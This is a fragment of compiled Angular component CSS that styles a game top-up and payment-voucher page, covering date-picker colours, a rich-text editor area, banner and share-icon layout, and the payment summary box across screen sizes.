        .mat-calendar-body-cell[_ngcontent-gtc-c19]:not(.mat-calendar-body-disabled):hover>.mat-calendar-body-cell-content[_ngcontent-gtc-c19]:not(.mat-calendar-body-selected),
        .mat-calendar-body-today[_ngcontent-gtc-c19]:not(.mat-calendar-body-selected) {
            border-color: transparent;
            background: #d0021b
        }

        .mat-calendar-body-selected[_ngcontent-gtc-c19] {
            background: #d0021b;
            box-shadow: none
        }

        .block-url[_ngcontent-gtc-c19] {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 91
        }

        .mat-primary[_ngcontent-gtc-c19] .mat-option.mat-selected[_ngcontent-gtc-c19]:not(.mat-option-disabled) {
            color: #000;
            opacity: .8
        }

        .mat-select-panel[_ngcontent-gtc-c19] .mat-option[_ngcontent-gtc-c19] {
            color: #797979
        }

        .ngx-editor-textarea[_ngcontent-gtc-c19] div[_ngcontent-gtc-c19],
        .ngx-editor-textarea[_ngcontent-gtc-c19] section[_ngcontent-gtc-c19] {
            max-width: 100% !important;
            width: 100% !important;
            background: 0 0 !important;
            box-shadow: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c19] div[_ngcontent-gtc-c19] img[_ngcontent-gtc-c19],
        .ngx-editor-textarea[_ngcontent-gtc-c19] section[_ngcontent-gtc-c19] img[_ngcontent-gtc-c19] {
            width: 100% !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c19] a[_ngcontent-gtc-c19] {
            text-decoration: none !important;
            border: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c19] *[_ngcontent-gtc-c19] {
            max-width: 100% !important;
            font-family: Montserrat !important;
            background: 0 0 !important;
            line-height: 1.5;
            word-break: break-word !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c19] b[_ngcontent-gtc-c19] {
            font-family: Montserrat-Bold !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c19] b[_ngcontent-gtc-c19] *[_ngcontent-gtc-c19] {
            font-family: Montserrat-Bold !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c19] td[_ngcontent-gtc-c19] {
            border-color: #6a707d !important;
            padding: 8px !important
        }

        .app-layout-wrap[_ngcontent-gtc-c19] {
            background-color: #000
        }

        @media (min-width:1200px) {
            .d-main[_ngcontent-gtc-c19] {
                max-width: 1440px;
                margin: 0 auto
            }
            .layout-content[_ngcontent-gtc-c19] {
                background-color: #000
            }
        }

        .d-absolute--center[_ngcontent-gtc-c19] {
            position: absolute;
            top: 40%;
            width: 100%;
            text-align: center;
            z-index: 2
        }

        .d-absolute--center[_ngcontent-gtc-c19] img[_ngcontent-gtc-c19] {
            width: 50px;
            opacity: .5
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] {
            position: relative
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .embed-url[_ngcontent-gtc-c19] {
            cursor: pointer
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] {
            background-color: #161619;
            position: relative;
            background-size: 100vh
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .second-background[_ngcontent-gtc-c19] {
            position: absolute;
            background-position: top;
            background-repeat: no-repeat;
            background-size: cover;
            width: 100%;
            height: 783px;
            top: 0;
            left: 0;
            z-index: 0
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .second-background[_ngcontent-gtc-c19]::after {
            content: "";
            position: absolute;
            z-index: 0;
            height: 100%;
            width: 100%;
            bottom: -1px;
            background: linear-gradient(to bottom, rgba(22, 22, 25, 0) 0, #161618 45%, #161618 100%)
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] {
            margin-top: 80px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .wrapper-MaainLogo[_ngcontent-gtc-c19] {
            position: static;
            z-index: 2;
            display: inline-block
        }

        @media (max-width:767px) {
            .header-text-extra-small-bold[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19] {
                font-size: 1em
            }
            .fleft[_ngcontent-gtc-c19] {
                float: right
            }
            .fright[_ngcontent-gtc-c19] {
                float: left
            }
            .popup-shuffle[_ngcontent-gtc-c19] .shuffle-container[_ngcontent-gtc-c19] .shuffle-pop-table[_ngcontent-gtc-c19] {
                padding: 0 20px
            }
            .mat-datepicker-toggle[_ngcontent-gtc-c19] button.mat-icon-button[_ngcontent-gtc-c19] {
                top: auto;
                bottom: 7px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .second-background[_ngcontent-gtc-c19]::after {
                background: linear-gradient(to bottom, rgba(22, 22, 25, 0) 26%, #161618 67%, #161618 100%)
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .wrapper-MaainLogo[_ngcontent-gtc-c19] {
                margin: 40px 0 15px 20px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .wrapper-MaainLogo[_ngcontent-gtc-c19] .con-card-voucher[_ngcontent-gtc-c19] img[_ngcontent-gtc-c19] {
                max-width: 70px;
                border-radius: 100%;
                border: 2px solid rgba(255, 255, 255, .4);
                margin-bottom: 10px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .wrapper-MaainLogo[_ngcontent-gtc-c19] .wrapper-title[_ngcontent-gtc-c19] .title[_ngcontent-gtc-c19] {
                font-family: Montserrat;
                font-weight: 600;
                line-height: 1.33;
                font-size: 24px;
                color: #fff
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] {
                padding: 0 20px
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .wrapper-MaainLogo[_ngcontent-gtc-c19] img[_ngcontent-gtc-c19] {
            display: block;
            border-radius: 0 0 4px 4px;
            width: 100px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] {
            font-size: 16px;
            font-family: Montserrat;
            color: #a6a6b2 !important
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .con-card-voucher[_ngcontent-gtc-c19] {
            position: relative;
            z-index: 13;
            min-width: 103px;
            min-height: 103px;
            max-width: 103px;
            max-height: 103px;
            -o-object-fit: contain;
            object-fit: contain;
            margin-top: 100px;
            text-align: center;
            border-radius: 4px;
            overflow: hidden;
            display: block
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .con-card-voucher[_ngcontent-gtc-c19] .game-image[_ngcontent-gtc-c19] {
            top: 0;
            position: absolute;
            min-width: 103px;
            min-height: 103px;
            max-width: 103px;
            max-height: 103px;
            -o-object-fit: contain;
            object-fit: contain;
            text-align: center;
            border-radius: 100%;
            z-index: 0;
            left: 0;
            border: 3px solid #a6a6b2
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .con-card-voucher[_ngcontent-gtc-c19] .voucher-banner[_ngcontent-gtc-c19] {
            position: absolute;
            height: 26px;
            width: 120px;
            z-index: 1;
            font-size: 10px;
            text-align: center;
            top: 8%;
            left: 53%;
            background: #d0021b;
            transform: rotate(45deg)
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .con-card-voucher[_ngcontent-gtc-c19] .voucher-banner[_ngcontent-gtc-c19] .banner-txt[_ngcontent-gtc-c19] {
            color: #fff;
            z-index: 2;
            position: relative;
            top: 4px;
            padding: 1px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-share .share {
            margin-top: 25px;
            color: #b4b4c0;
            margin-bottom: 12px;
            font-family: Montserrat-bold, Arial;
            font-size: 14px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-share .shareIcon a img {
            max-height: 35px;
            width: auto;
            margin-right: 15px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-share .shareIcon a img.share-widget {
            position: relative;
            top: 3px;
            max-height: 35px;
            width: auto;
            margin-right: 15px
        }

        @media (max-width:991px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] {
                padding-bottom: 0
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .second-background[_ngcontent-gtc-c19] {
                height: 267px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] {
                margin-top: 40px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .con-card-voucher[_ngcontent-gtc-c19] {
                margin-top: 45px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .con-card-voucher[_ngcontent-gtc-c19] .game-image[_ngcontent-gtc-c19] {
                max-width: 160px;
                max-height: 160px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-share {
                margin-bottom: 20px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-share .shareIcon a img {
                max-height: 35px;
                margin-right: 10px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-share .shareIcon a img.share-widget {
                max-height: 35px;
                margin-right: 10px
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-share .shareIcon h6 {
            text-decoration: line-through
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-share .shareIcon h4,
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-share .shareIcon h6 {
            text-align: left
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-share .d-shareIcon {
            position: relative
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-share .d-shareIcon .d-shareIcon--absolute {
            position: absolute;
            top: 0;
            text-align: center
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-share .d-shareIcon .d-shareIcon--absolute .sb-button {
            margin: 0 !important
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-share .d-shareIcon .d-shareIcon--absolute .sb-button .sb-wrapper {
            min-width: auto !important;
            opacity: 0
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-title[_ngcontent-gtc-c19] {
            border-bottom: 1px solid rgba(106, 112, 125, .4)
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-title[_ngcontent-gtc-c19] .title[_ngcontent-gtc-c19] {
            margin-top: 25px;
            line-height: 1.3;
            max-width: 80%;
            font-size: 30px;
            font-family: Montserrat-Bold;
            margin-bottom: 25px;
            color: #fff
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .descTitle[_ngcontent-gtc-c19] {
            font-size: 16px;
            line-height: 1.5;
            color: #fff
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .descTitle.seeMore[_ngcontent-gtc-c19] {
            max-height: 36px;
            overflow: hidden;
            text-overflow: ellipsis
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .descTitle[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19] {
            display: inline-block;
            font-size: inherit;
            font-family: inherit;
            line-height: inherit;
            text-overflow: ellipsis
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .descTitle[_ngcontent-gtc-c19] span.grayLight[_ngcontent-gtc-c19] {
            font-size: 16px;
            line-height: 1.5
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .descTitle[_ngcontent-gtc-c19] span.grayLight[_ngcontent-gtc-c19] b[_ngcontent-gtc-c19] {
            color: #fff
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .descTitle[_ngcontent-gtc-c19] span.grayLight[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            font-size: 16px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19] {
            font-size: 16px;
            font-family: Montserrat;
            color: #a6a6b2 !important
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] ol[_ngcontent-gtc-c19] {
            padding-left: 19px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] ol[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] {
            padding-bottom: 10px;
            padding-left: 10px;
            color: #a6a6b2 !important;
            font-size: 16px;
            font-family: Montserrat
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] ol[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19] {
            color: #a6a6b2 !important
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] {
            float: right
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .wrapper-close-round[_ngcontent-gtc-c19] {
            text-align: right
        }

        @media (max-width:991px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .wrapper-title[_ngcontent-gtc-c19] .title[_ngcontent-gtc-c19] {
                max-width: unset;
                font-size: 24px;
                margin-top: 15px;
                margin-bottom: 10px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-leftPayment[_ngcontent-gtc-c19] .descTitle[_ngcontent-gtc-c19] {
                font-size: 16px;
                padding-bottom: 0;
                border: 0
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] {
                padding: 0;
                float: none
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .wrapper-close-round[_ngcontent-gtc-c19] {
                display: none
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .wrapper-close-round[_ngcontent-gtc-c19]>div[_ngcontent-gtc-c19] {
            text-align: right;
            margin-bottom: 25px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .wrapper-close-round[_ngcontent-gtc-c19] h4[_ngcontent-gtc-c19] {
            display: inline-block;
            text-transform: uppercase;
            font-family: Montserrat-bold;
            color: #fff;
            font-size: 14px;
            letter-spacing: 1px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .wrapper-close-round[_ngcontent-gtc-c19] a[_ngcontent-gtc-c19] {
            width: 15px;
            height: auto;
            border-radius: 100%
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .wrapper-close-round[_ngcontent-gtc-c19] a[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            display: inline-block;
            border: 2.8px solid #fff;
            border-radius: 100%;
            width: 41px;
            height: 41px;
            position: relative;
            opacity: .5;
            margin-bottom: -14px;
            margin-left: 10px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .wrapper-close-round[_ngcontent-gtc-c19] a[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] img[_ngcontent-gtc-c19] {
            width: 50%;
            position: relative;
            top: 50%;
            transform: translateY(-50%);
            margin: auto;
            display: block
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .card-body[_ngcontent-gtc-c19] {
            border-radius: 4px;
            box-shadow: none;
            background-color: #25262b;
            position: relative;
            margin-top: 45px;
            color: #fff;
            padding-bottom: 20px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] {
            padding: 20px 0 0;
            border-radius: 3px;
            box-shadow: 0 8px 10px 0 rgba(0, 0, 0, .23)
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19] {
            line-height: 1.5
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19] b[_ngcontent-gtc-c19] {
            font-size: 16px;
            font-family: Montserrat;
            font-weight: 600
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] ul[_ngcontent-gtc-c19] {
            padding: 0;
            list-style: none
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] ul[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] {
            padding: 0 25px 10px;
            border-bottom: 1px solid rgba(106, 112, 125, .4);
            margin-bottom: 20px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] ul[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] .one-line[_ngcontent-gtc-c19] .col-md-8[_ngcontent-gtc-c19] {
            padding-right: 8px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] ul[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] .one-line[_ngcontent-gtc-c19] .col-md-4[_ngcontent-gtc-c19] {
            padding-left: 8px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] ul[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] .one-line[_ngcontent-gtc-c19] .col-md-12[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] ul[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] .one-line[_ngcontent-gtc-c19] .col-xs-12[_ngcontent-gtc-c19] {
            margin: -10px 0 10px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] ul[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19]:last-child {
            border-bottom: none;
            margin-bottom: 0
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] ul[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] .title-classificartion[_ngcontent-gtc-c19] {
            margin-top: 10px;
            font-family: Montserrat;
            font-size: 16px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] ul[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] .title-classificartion[_ngcontent-gtc-c19]:first-of-type {
            margin-top: 20px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] h6[_ngcontent-gtc-c19] {
            font-size: 12px;
            color: #b4b4c0;
            margin: 20px 0 10px;
            line-height: 1.5
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] h6[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            color: inherit;
            font-size: inherit;
            line-height: inherit;
            margin-top: 10px
        }

        @media (max-width:991px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .card-body[_ngcontent-gtc-c19] {
                margin-top: 10px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] {
                padding: 15px 0 0;
                margin-bottom: 0
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] .no-margin-channel[_ngcontent-gtc-c19] {
                margin: 0 -5px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] ul[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] {
                margin-bottom: 15px;
                padding: 15px 20px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] ul[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19]:first-child {
                padding-bottom: 0
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] h6[_ngcontent-gtc-c19] {
                font-size: 12px;
                margin: 8px 0 15px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] h6[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
                display: inline-block;
                margin: 0
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .dg-payment-banner[_ngcontent-gtc-c19] .box-rightPayment[_ngcontent-gtc-c19] .box-paymentVoucher[_ngcontent-gtc-c19] input[_ngcontent-gtc-c19]:-internal-autofill-previewed {
            background-color: #323339 !important
        }

